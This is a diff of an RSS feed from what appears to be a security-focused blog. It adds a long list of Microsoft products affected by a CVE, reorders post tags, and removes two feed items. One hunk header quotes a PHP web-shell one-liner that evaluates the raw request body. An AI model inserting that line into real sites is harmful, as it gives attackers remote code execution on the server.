+&lt;p&gt;&lt;strong&gt;Application：&lt;/strong&gt;&lt;br /&gt;
+• Windows Server 2022&lt;br /&gt;
+• Windows Server 2019 (Server Core installation)&lt;br /&gt;
+• Windows Server 2019&lt;br /&gt;
+• Windows 10 Version 1809 for ARM64-based Systems&lt;br /&gt;
+• Windows 10 Version 1809 for x64-based Systems&lt;br /&gt;
+• C SDK for Azure IoT&lt;br /&gt;
+• Azure IoT Hub Device Client SDK&lt;br /&gt;
+• Windows 11 Version 24H2 for x64-based Systems&lt;br /&gt;
+• Windows 11 Version 24H2 for ARM64-based Systems&lt;br /&gt;
+• Windows 11 Version 23H2 for x64-based Systems&lt;br /&gt;
+• Windows 11 Version 23H2 for ARM64-based Systems&lt;br /&gt;
+• Windows 10 Version 22H2 for 32-bit Systems&lt;br /&gt;
+• Windows 10 Version 21H2 for x64-based Systems&lt;br /&gt;
+• Windows 10 Version 21H2 for ARM64-based Systems&lt;br /&gt;
+• Windows 10 Version 21H2 for 32-bit Systems&lt;br /&gt;
+• Windows 11 version 21H2 for ARM64-based Systems&lt;br /&gt;
+• Windows 11 version 21H2 for x64-based Systems&lt;br /&gt;
+• Windows Server 2022 (Server Core installation)&lt;br /&gt;
+• Windows Server 2016&lt;br /&gt;
+• Windows 10 Version 1607 for x64-based Systems&lt;br /&gt;
+• Windows 10 Version 1607 for 32-bit Systems&lt;br /&gt;
+• Windows 10 for x64-based Systems&lt;br /&gt;
+• Windows 10 for 32-bit Systems&lt;br /&gt;
+• Windows Server 2022, 23H2 Edition (Server Core installation)&lt;br /&gt;
+• Windows Server 2012 (Server Core installation)&lt;br /&gt;
+• Windows Server 2012&lt;br /&gt;
+• Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core&lt;br /&gt;
+installation)&lt;br /&gt;
+• Windows Server 2008 R2 for x64-based Systems Service Pack 1&lt;br /&gt;
+• Windows Server 2016 (Server Core installation)&lt;br /&gt;
+• Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core&lt;br /&gt;
+installation)&lt;br /&gt;
+• Windows Server 2008 for 32-bit Systems Service Pack 2&lt;br /&gt;
+• Windows 10 Version 22H2 for ARM64-based Systems&lt;br /&gt;
+• Windows 10 Version 22H2 for x64-based Systems&lt;br /&gt;
+• Windows 11 Version 22H2 for x64-based Systems&lt;br /&gt;
+• Windows 11 Version 22H2 for ARM64-based Systems&lt;br /&gt;
+• Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core&lt;br /&gt;
+installation)&lt;br /&gt;
+• Windows Server 2008 for x64-based Systems Service Pack 2&lt;br /&gt;
+• Windows Server 2012 R2 (Server Core installation)&lt;br /&gt;
+• Windows Server 2012 R2&lt;br /&gt;
+• Azure Health Bot&lt;br /&gt;
+• Windows 10 Version 1809 for 32-bit Systems&lt;br /&gt;
+• Microsoft Dynamics 365 (on-premises) version 9.1&lt;br /&gt;
+• CBL Mariner 2.0 x64&lt;br /&gt;
+• CBL Mariner 2.0 ARM&lt;br /&gt;
+• CBL Mariner 1.0 x64&lt;br /&gt;
+• CBL Mariner 1.0 ARM&lt;br /&gt;
+• Azure Linux 3.0 x64&lt;br /&gt;
+• Azure Linux 3.0 ARM&lt;br /&gt;
+• Azure CycleCloud 8.6.1&lt;br /&gt;
+• Azure CycleCloud 8.6.2&lt;br /&gt;
+• Azure CycleCloud 8.5.0&lt;br /&gt;
+• Azure CycleCloud 8.4.2&lt;br /&gt;
+• Azure CycleCloud 8.4.1&lt;br /&gt;
+• Azure CycleCloud 8.4.0&lt;br /&gt;
+• Azure CycleCloud 8.3.0&lt;br /&gt;
+• Azure CycleCloud 8.2.1&lt;br /&gt;
+• Azure CycleCloud 8.2.2&lt;br /&gt;
+• Azure CycleCloud 8.1.1&lt;br /&gt;
+• Azure CycleCloud 8.1.0&lt;br /&gt;
+• Azure CycleCloud 8.0.2&lt;br /&gt;
+• Azure CycleCloud 8.0.1&lt;br /&gt;
+• Azure CycleCloud 8.6.0&lt;br /&gt;
+• Azure CycleCloud 8.0.0&lt;br /&gt;
+• Azure CycleCloud 8.2.0&lt;br /&gt;
+• Microsoft Office LTSC 2021 for 64-bit editions&lt;br /&gt;
+• Microsoft Office LTSC 2021 for 32-bit editions&lt;br /&gt;
+• Microsoft Project 2016 (64-bit edition)&lt;br /&gt;
+• Microsoft Project 2016 (32-bit edition)&lt;br /&gt;
+• Microsoft 365 Apps for Enterprise for 64-bit Systems&lt;br /&gt;
+• Microsoft 365 Apps for Enterprise for 32-bit Systems&lt;br /&gt;
+• Microsoft Office 2019 for 64-bit editions&lt;br /&gt;
+• Microsoft Office 2019 for 32-bit editions&lt;br /&gt;
+• App Installer&lt;br /&gt;
+• Microsoft Outlook 2016 (64-bit edition)&lt;br /&gt;
+• Microsoft Outlook 2016 (32-bit edition)&lt;br /&gt;
+• Microsoft PowerPoint 2016 (64-bit edition)&lt;br /&gt;
+• Microsoft PowerPoint 2016 (32-bit edition)&lt;br /&gt;
+• Microsoft Office LTSC for Mac 2021&lt;br /&gt;
+• Azure Connected Machine Agent&lt;br /&gt;
+• Remote Desktop client for Windows Desktop&lt;br /&gt;
+• Microsoft OfficePLUS&lt;br /&gt;
+• Azure Stack Hub&lt;br /&gt;
+• Microsoft Teams for iOS&lt;br /&gt;
+• Microsoft Visual Studio 2022 version 17.8&lt;br /&gt;
+• Microsoft Visual Studio 2022 version 17.10&lt;br /&gt;
+• Microsoft Visual Studio 2022 version 17.6&lt;br /&gt;
+• .NET 8.0&lt;br /&gt;
+• Microsoft Edge (Chromium-based)&lt;br /&gt;
+• Microsoft Office 2016 (64-bit edition)&lt;br /&gt;
+• Microsoft Office 2016 (32-bit edition)&lt;br /&gt;
+• Microsoft Copilot Studio&lt;br /&gt;
+• Dynamics CRM Service Portal Web Resource&lt;br /&gt;
+• Dynamics 365 Field Service (on-premises) v7 series&lt;br /&gt;
+• GroupMe&lt;br /&gt;
+• Azure Arc Resource Bridge&lt;br /&gt;
+• Azure Kubernetes Service Node on Ubuntu Linux&lt;br /&gt;
+• Azure Kubernetes Service Node on Azure Linux&lt;br /&gt;
+• PowerShell 7.2&lt;br /&gt;
+• PowerShell 7.4&lt;br /&gt;
+• .NET 6.0&lt;br /&gt;
+• Microsoft Visual Studio 2022 version 17.4&lt;br /&gt;
+• Azure CycleCloud 7.9.5&lt;br /&gt;
+• Azure CycleCloud 7.9.4&lt;br /&gt;
+• Azure CycleCloud 7.9.6&lt;br /&gt;
+• Azure CycleCloud 7.9.2&lt;br /&gt;
+• Azure CycleCloud 7.9.11&lt;br /&gt;
+• Azure CycleCloud 7.9.8&lt;br /&gt;
+• Azure CycleCloud 7.9.10&lt;br /&gt;
+• Microsoft Defender for IoT&lt;br /&gt;
+• Microsoft .NET Framework 3.5 AND 4.7.2&lt;br /&gt;
+• Microsoft .NET Framework 3.5 AND 4.8&lt;br /&gt;
+• Microsoft .NET Framework 4.8&lt;br /&gt;
+• Microsoft .NET Framework 3.5.1&lt;br /&gt;
+• Microsoft .NET Framework 3.5&lt;br /&gt;
+• Microsoft .NET Framework 4.6.2/4.7/4.7.1/4.7.2&lt;br /&gt;
+• Microsoft .NET Framework 3.0 Service Pack 2&lt;br /&gt;
+• Microsoft .NET Framework 2.0 Service Pack 2&lt;br /&gt;
+• Microsoft .NET Framework 4.6/4.6.2&lt;br /&gt;
+• Microsoft .NET Framework 4.6.2&lt;br /&gt;
+• Microsoft .NET Framework 3.5 AND 4.8.1&lt;br /&gt;
+• Microsoft SharePoint Server Subscription Edition&lt;br /&gt;
+• Microsoft SharePoint Server 2019&lt;br /&gt;
+• Microsoft SharePoint Enterprise Server 2016&lt;br /&gt;
+• Azure CycleCloud 7.9.7&lt;br /&gt;
+• Azure CycleCloud 7.9.9&lt;br /&gt;
+• Azure CycleCloud 7.9.1&lt;br /&gt;
+• Azure CycleCloud 7.9.3&lt;br /&gt;
+• Azure CycleCloud 7.9.0&lt;br /&gt;
+• Microsoft SQL Server 2019 for x64-based Systems (CU 27)&lt;br /&gt;
+• Microsoft SQL Server 2022 for x64-based Systems (CU 13)&lt;br /&gt;
+• Microsoft SQL Server 2022 for x64-based Systems (GDR)&lt;br /&gt;
+• Microsoft SQL Server 2017 for x64-based Systems (CU 31)&lt;br /&gt;
+• Microsoft SQL Server 2016 for x64-based Systems Service Pack 3 Azure&lt;br /&gt;
+Connect Feature Pack&lt;br /&gt;
+• Microsoft SQL Server 2016 for x64-based Systems Service Pack 3 (GDR)&lt;br /&gt;
+• Microsoft SQL Server 2019 for x64-based Systems (GDR)&lt;br /&gt;
+• Microsoft SQL Server 2017 for x64-based Systems (GDR)&lt;br /&gt;
+• Microsoft OLE DB Driver 18 for SQL Server&lt;br /&gt;
+• Microsoft OLE DB Driver 19 for SQL Server&lt;br /&gt;
+• Azure DevOps Server 2022.1&lt;br /&gt;
+• Azure Network Watcher VM Extension for Windows&lt;br /&gt;
+• Azure Kinect SD&lt;br /&gt;
+• Microsoft Window&lt;/p&gt;
+ ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">http://example.com/2024/08/15/Internet%20Security/Esxi%20inet%20%E9%87%8D%E5%A4%8D%E5%8D%A0%E7%94%A8%E5%AF%BC%E8%87%B4%20SSH%20%E6%96%AD%E8%BF%9E%E9%97%AE%E9%A2%98%20&amp;%20%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</guid>
             <title>Esxi inet 重复占用导致 SSH 断连问题 &amp; 解决方案</title>
@@ -262,8 +527,8 @@
             <category term="CVE" scheme="http://example.com/categories/CVE/" />
             <category term="Windows" scheme="http://example.com/categories/CVE/Windows/" />
             <category term="CVE" scheme="http://example.com/tags/CVE/" />
-            <category term="Microsoft Server" scheme="http://example.com/tags/Microsoft-Server/" />
             <category term="Windows" scheme="http://example.com/tags/Windows/" />
+            <category term="Microsoft Server" scheme="http://example.com/tags/Microsoft-Server/" />
             <pubDate>Wed, 14 Aug 2024 15:55:24 +0800</pubDate>
             <description><![CDATA[ &lt;p&gt;&lt;div class=&#34;links&#34;&gt;&lt;div class=&#34;item&#34; title=&#34;夏荷影&#34; style=&#34;--block-color:#616fac;&#34;&gt;&lt;a href=&#34;https://blog.csdn.net/qq_44465615/article/details/109690573&#34; class=&#34;image&#34; data-background-image=&#34;https://s2.loli.net/2024/08/14/Cam9VBr85pAo6fx.png&#34;&gt;&lt;/a&gt;
         &lt;div class=&#34;info&#34;&gt;
@@ -476,8 +741,8 @@ eval(’?&amp;gt;’.file_get_contents(‘php://input’));&lt;/p&gt;
             <category term="CVE" scheme="http://example.com/categories/CVE/" />
             <category term="Exchange" scheme="http://example.com/categories/CVE/Exchange/" />
             <category term="CVE" scheme="http://example.com/tags/CVE/" />
-            <category term="Exchange" scheme="http://example.com/tags/Exchange/" />
             <category term="Microsoft Server" scheme="http://example.com/tags/Microsoft-Server/" />
+            <category term="Exchange" scheme="http://example.com/tags/Exchange/" />
             <pubDate>Tue, 13 Aug 2024 14:32:37 +0800</pubDate>
             <description><![CDATA[ &lt;p&gt;&lt;div class=&#34;links&#34;&gt;&lt;div class=&#34;item&#34; title=&#34;Colin.B&#34; style=&#34;--block-color:#3d97cb;&#34;&gt;&lt;a href=&#34;https://www.cnblogs.com/colin-B/p/15783751.html&#34; class=&#34;image&#34; data-background-image=&#34;/assets/404.png&#34;&gt;&lt;/a&gt;
         &lt;div class=&#34;info&#34;&gt;
@@ -1428,35 +1693,6 @@ mac 下的&lt;br /&gt;
 &lt;li&gt;添加本站后，在下方 Post 处留言，格式如下&lt;/li&gt;
 &lt;/ul&gt;
 &lt;figure class=&#34;highlight yml&#34;&gt;&lt;figcaption data-lang=&#34;YAML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;token key atrule&#34;&gt;site&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#网站的名字&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token key atrule&#34;&gt;owner&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#您的名字&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token key atrule&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#您的网址&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token key atrule&#34;&gt;desc&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#简短描述&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token key atrule&#34;&gt;image&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#一张图片&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token key atrule&#34;&gt;color&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#方块颜色&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">http://example.com/2024/08/02/Web3/Solidity/</guid>
-            <title>Solidity</title>
-            <link>http://example.com/2024/08/02/Web3/Solidity/</link>
-            <category term="Web3" scheme="http://example.com/categories/Web3/" />
-            <category term="Web3" scheme="http://example.com/tags/Web3/" />
-            <category term="Solidity" scheme="http://example.com/tags/Solidity/" />
-            <pubDate>Fri, 02 Aug 2024 14:56:14 +0800</pubDate>
-            <description><![CDATA[ &lt;h1 id=&#34;solidity&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#solidity&#34;&gt;#&lt;/a&gt; Solidity&lt;/h1&gt;
-&lt;p&gt;&lt;div class=&#34;links&#34;&gt;&lt;div class=&#34;item&#34; title=&#34;Solidity Academy&#34; style=&#34;--block-color:#e9546b;&#34;&gt;&lt;a href=&#34;https://www.wtf.academy/&#34; class=&#34;image&#34; data-background-image=&#34;https://www.wtf.academy/img/logo.png&#34;&gt;&lt;/a&gt;
-        &lt;div class=&#34;info&#34;&gt;
-        &lt;a href=&#34;https://www.wtf.academy/&#34; class=&#34;title&#34;&gt;Solidity Academy&lt;/a&gt;
-        &lt;p class=&#34;desc&#34;&gt;Web3 Academy&lt;/p&gt;
-        &lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;item&#34; title=&#34;Remix&#34; style=&#34;--block-color:#9d5b8b;&#34;&gt;&lt;a href=&#34;https://remix.ethereum.org/&#34; class=&#34;image&#34; data-background-image=&#34;/assets/404.png&#34;&gt;&lt;/a&gt;
-        &lt;div class=&#34;info&#34;&gt;
-        &lt;a href=&#34;https://remix.ethereum.org/&#34; class=&#34;title&#34;&gt;Remix&lt;/a&gt;
-        &lt;p class=&#34;desc&#34;&gt;以太链上的合约开发 IDE&lt;/p&gt;
-        &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">http://example.com/2024/07/31/Algorithm/Top%2010%20Sorting%20Algorithm/%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F/</guid>
-            <title>选择排序</title>
-            <link>http://example.com/2024/07/31/Algorithm/Top%2010%20Sorting%20Algorithm/%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F/</link>
-            <category term="Algorithm" scheme="http://example.com/categories/Algorithm/" />
-            <category term="Algorithm, Top 10 Sorting Algorithm" scheme="http://example.com/categories/Algorithm/Algorithm-Top-10-Sorting-Algorithm/" />
-            <pubDate>Wed, 31 Jul 2024 22:16:49 +0800</pubDate>
-            <description><![CDATA[  ]]></description>
         </item>
     </channel>
 </rss>
